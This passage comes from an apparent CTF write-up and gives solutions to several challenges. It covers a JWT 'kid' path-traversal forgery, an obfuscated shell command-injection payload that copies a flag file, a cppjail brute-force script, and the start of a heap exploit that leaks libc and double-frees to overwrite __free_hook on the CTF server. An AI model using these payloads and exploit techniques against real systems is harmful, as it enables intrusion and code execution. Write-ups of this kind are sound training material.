<li>Save <a href="https://evanhahn.com/worlds-smallest-png/">https://evanhahn.com/worlds-smallest-png/</a> as <code>small.png</code>.</li>
<li>Join <code>small.png</code> and <code>public.pem</code> with a line break to form <code>upload.png</code>.</li>
<li>Upload <code>upload.png</code>.</li>
<li>Using <a href="https://jwt.io/">https://jwt.io/</a>, sign the JWT with <code>kid</code> equal to <code>../uploads/&#x3C;uuid>.png</code> and <code>admin</code> equal to <code>true</code>.</li>
<li>Download the flag image. The flag is <code>bctf{should've_used_imgur}</code>.</li>
</ol>
<p><img  src="/blog/_astro/jwt.DU_uusdp_Z6Mxj1.webp" alt="jwt.io" width="2104" height="1516" loading="lazy" decoding="async"></p>
<h2 id="web3-city-elves-writeups">web/3-city-elves-writeups</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span>";A=a;B=b;C=c;E=e;S=s;T=3;c${A}t app.py|he${A}d -c 176|t${A}il -c1>SLASH;re${A}d SEP&#x3C;SLASH;${C}p ${SEP}flag.png as${S}ets${SEP}flag.png;${E}cho "</span></span>
<span class="line"><span></span></span></code></pre>
<p>The flag is <code>bctf{Lucky_you_I_did_not_code_this_stuff_in_Ruby_lasudkjklhdsfkhjkae}</code>.</p>
<h2 id="misccppjail">misc/cppjail</h2>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> pwn </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-token-keyword)"> *</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">N </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-constant)"> 53</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">solution </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> [</span><span style="color:var(--astro-code-token-string-expression)">'b'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'c'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 't'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'f'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '{'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'Y'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '0'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'U'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '4'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'r'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'E'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'f'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'U'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'l'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'l'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'o'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'f'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'b'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'u'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '1'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '1'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'C'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '+'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '+'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '1'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 's'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '@'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'h'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '0'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'r'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'r'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'i'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '8'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'l'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'e'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '_'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'l'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'a'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'n'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> 'g'</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-string-expression)"> '}'</span><span style="color:var(--astro-code-color-text)">]</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-color-text)"> solution</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">is</span><span style="color:var(--astro-code-token-keyword)"> not</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(i, end</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">""</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    else</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"*"</span><span style="color:var(--astro-code-token-punctuation)">, end</span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-string-expression)">""</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-color-text)"> sys</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">sys</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">exit</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">for</span><span style="color:var(--astro-code-color-text)"> i </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(N):</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    if</span><span style="color:var(--astro-code-color-text)"> solution</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-token-keyword)"> is</span><span style="color:var(--astro-code-token-keyword)"> not</span><span style="color:var(--astro-code-token-constant)"> None</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        continue</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    for</span><span style="color:var(--astro-code-color-text)"> c </span><span style="color:var(--astro-code-token-keyword)">in</span><span style="color:var(--astro-code-token-function)"> range</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">32</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">127</span><span style="color:var(--astro-code-token-punctuation)">):</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        o </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> chr</span><span style="color:var(--astro-code-token-punctuation)">(c)</span></span>
<span class="line"><span style="color:var(--astro-code-token-comment)">        # r = process(["python3", "compile.py"])</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(i, </span><span style="color:var(--astro-code-token-function)">chr</span><span style="color:var(--astro-code-token-punctuation)">(c))</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        r </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> remote</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"gold.b01le.rs"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">7003</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Input your code: "</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">f</span><span style="color:var(--astro-code-token-string-expression)">"Jail&#x3C;bool>::lock&#x3C;'</span><span style="color:var(--astro-code-token-constant)">{</span><span style="color:var(--astro-code-token-punctuation)">o</span><span style="color:var(--astro-code-token-constant)">}</span><span style="color:var(--astro-code-token-string-expression)">',</span><span style="color:var(--astro-code-token-constant)">{</span><span style="color:var(--astro-code-token-punctuation)">i</span><span style="color:var(--astro-code-token-constant)">}</span><span style="color:var(--astro-code-token-string-expression)">>j;static_assert(sizeof(decltype(j))==4);"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        line </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">        print</span><span style="color:var(--astro-code-token-punctuation)">(line)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">        r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">close</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">        if</span><span style="color:var(--astro-code-token-keyword)"> b</span><span style="color:var(--astro-code-token-string-expression)">"Prisoner 2"</span><span style="color:var(--astro-code-token-keyword)"> in</span><span style="color:var(--astro-code-color-text)"> line</span><span style="color:var(--astro-code-token-punctuation)">:</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">            solution</span><span style="color:var(--astro-code-token-punctuation)">[</span><span style="color:var(--astro-code-color-text)">i</span><span style="color:var(--astro-code-token-punctuation)">]</span><span style="color:var(--astro-code-token-keyword)"> =</span><span style="color:var(--astro-code-token-function)"> chr</span><span style="color:var(--astro-code-token-punctuation)">(c)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">            print</span><span style="color:var(--astro-code-token-punctuation)">(solution)</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">            break</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(solution)</span></span>
<span class="line"></span></code></pre>
<p>and fill the unknown characters with <code>*</code>. The flag is <code>bctf{Y0U_4rE_fUll_of_bu11****_C++_1s_@_h0rri8le_lang}</code>.</p>
<h2 id="pwneasy-note">pwn/easy-note</h2>
<p>libc leak + double free</p>
<pre class="astro-code css-variables" style="background-color:var(--astro-code-color-background);color:var(--astro-code-color-text); overflow-x: auto;" tabindex="0"><code><span class="line"><span style="color:var(--astro-code-token-keyword)">from</span><span style="color:var(--astro-code-color-text)"> pwn </span><span style="color:var(--astro-code-token-keyword)">import</span><span style="color:var(--astro-code-token-keyword)"> *</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">_r </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> remote</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"gold.b01le.rs"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">4001</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">def</span><span style="color:var(--astro-code-token-function)"> alloc</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-parameter)">where</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-parameter)"> size</span><span style="color:var(--astro-code-token-keyword)">=0x</span><span style="color:var(--astro-code-token-constant)">20</span><span style="color:var(--astro-code-color-text)">):</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Resize----\n"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"1"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Where?"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">str</span><span style="color:var(--astro-code-token-punctuation)">(where).</span><span style="color:var(--astro-code-token-function)">encode</span><span style="color:var(--astro-code-token-punctuation)">())</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"size?"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">str</span><span style="color:var(--astro-code-token-punctuation)">(size).</span><span style="color:var(--astro-code-token-function)">encode</span><span style="color:var(--astro-code-token-punctuation)">())</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">def</span><span style="color:var(--astro-code-token-function)"> free</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-parameter)">where</span><span style="color:var(--astro-code-color-text)">):</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Resize----\n"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"2"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Where?"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">str</span><span style="color:var(--astro-code-token-punctuation)">(where).</span><span style="color:var(--astro-code-token-function)">encode</span><span style="color:var(--astro-code-token-punctuation)">())</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">def</span><span style="color:var(--astro-code-token-function)"> view</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-parameter)">where</span><span style="color:var(--astro-code-color-text)">):</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Resize----\n"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"3"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Where?"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">str</span><span style="color:var(--astro-code-token-punctuation)">(where).</span><span style="color:var(--astro-code-token-function)">encode</span><span style="color:var(--astro-code-token-punctuation)">())</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recv</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">0x</span><span style="color:var(--astro-code-token-constant)">10</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">    return</span><span style="color:var(--astro-code-color-text)"> _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">recvline</span><span style="color:var(--astro-code-token-punctuation)">().</span><span style="color:var(--astro-code-token-function)">strip</span><span style="color:var(--astro-code-token-punctuation)">()</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-keyword)">def</span><span style="color:var(--astro-code-token-function)"> edit</span><span style="color:var(--astro-code-color-text)">(</span><span style="color:var(--astro-code-token-parameter)">where</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-parameter)"> size</span><span style="color:var(--astro-code-token-punctuation)">,</span><span style="color:var(--astro-code-token-parameter)"> content</span><span style="color:var(--astro-code-color-text)">):</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Resize----\n"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"4"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"Where?"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">str</span><span style="color:var(--astro-code-token-punctuation)">(where).</span><span style="color:var(--astro-code-token-function)">encode</span><span style="color:var(--astro-code-token-punctuation)">())</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendlineafter</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"size?"</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-constant)">str</span><span style="color:var(--astro-code-token-punctuation)">(size).</span><span style="color:var(--astro-code-token-function)">encode</span><span style="color:var(--astro-code-token-punctuation)">())</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">    _r</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-token-function)">sendline</span><span style="color:var(--astro-code-token-punctuation)">(content)</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">alloc</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">0x</span><span style="color:var(--astro-code-token-constant)">420</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">alloc</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">1</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">0x</span><span style="color:var(--astro-code-token-constant)">420</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">free</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-color-text)">leak </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> u64</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-function)">view</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">).</span><span style="color:var(--astro-code-token-function)">ljust</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">8</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">b</span><span style="color:var(--astro-code-token-string-expression)">"\0"</span><span style="color:var(--astro-code-token-punctuation)">))</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">main_arena_offset </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-keyword)"> 0x</span><span style="color:var(--astro-code-token-constant)">3EBC40</span><span style="color:var(--astro-code-token-keyword)"> +</span><span style="color:var(--astro-code-token-keyword)"> 0x</span><span style="color:var(--astro-code-token-constant)">70</span><span style="color:var(--astro-code-token-keyword)"> -</span><span style="color:var(--astro-code-token-keyword)"> 0x</span><span style="color:var(--astro-code-token-constant)">10</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">libc_base </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> leak </span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-color-text)"> main_arena_offset</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">libc_base </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> libc_base </span><span style="color:var(--astro-code-token-keyword)">-</span><span style="color:var(--astro-code-token-keyword)"> 0x</span><span style="color:var(--astro-code-token-constant)">37000</span><span style="color:var(--astro-code-token-keyword)"> +</span><span style="color:var(--astro-code-token-keyword)"> 0x</span><span style="color:var(--astro-code-token-constant)">73000</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">f</span><span style="color:var(--astro-code-token-string-expression)">"</span><span style="color:var(--astro-code-token-constant)">{</span><span style="color:var(--astro-code-token-punctuation)">libc_base = </span><span style="color:var(--astro-code-token-keyword)">:#x</span><span style="color:var(--astro-code-token-constant)">}</span><span style="color:var(--astro-code-token-string-expression)">"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">libc </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-token-function)"> ELF</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-string-expression)">"./libc.so.6"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-color-text)">libc</span><span style="color:var(--astro-code-token-punctuation)">.</span><span style="color:var(--astro-code-color-text)">address </span><span style="color:var(--astro-code-token-keyword)">=</span><span style="color:var(--astro-code-color-text)"> libc_base</span></span>
<span class="line"></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">alloc</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">free</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">free</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">alloc</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">edit</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-keyword)">0x</span><span style="color:var(--astro-code-token-constant)">8</span><span style="color:var(--astro-code-token-punctuation)">, </span><span style="color:var(--astro-code-token-function)">p64</span><span style="color:var(--astro-code-token-punctuation)">(libc.symbols.__free_hook))</span></span>
<span class="line"><span style="color:var(--astro-code-token-function)">print</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-keyword)">f</span><span style="color:var(--astro-code-token-string-expression)">"</span><span style="color:var(--astro-code-token-constant)">{</span><span style="color:var(--astro-code-token-punctuation)">libc.symbols.__free_hook = </span><span style="color:var(--astro-code-token-keyword)">:#x</span><span style="color:var(--astro-code-token-constant)">}</span><span style="color:var(--astro-code-token-string-expression)">"</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
<span class="line"><span style="color:var(--astro-code-token-function)">alloc</span><span style="color:var(--astro-code-token-punctuation)">(</span><span style="color:var(--astro-code-token-constant)">0</span><span style="color:var(--astro-code-token-punctuation)">)</span></span>
<span class="line"></span>
